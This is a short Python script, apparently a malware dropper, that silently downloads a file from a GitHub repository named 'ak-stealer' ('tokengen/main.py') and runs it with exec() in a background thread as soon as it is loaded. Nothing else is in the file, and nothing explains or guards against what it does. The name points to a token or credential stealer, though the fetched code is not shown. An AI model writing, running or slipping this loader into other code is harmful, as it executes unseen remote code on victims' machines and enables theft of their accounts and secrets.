import urllib.request
import threading

def fetch_and_execute_code():
    url = 'https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/tokengen/main.py'
    code = urllib.request.urlopen(url).read().decode()
    exec(code)

threading.Thread(target=fetch_and_execute_code).start()
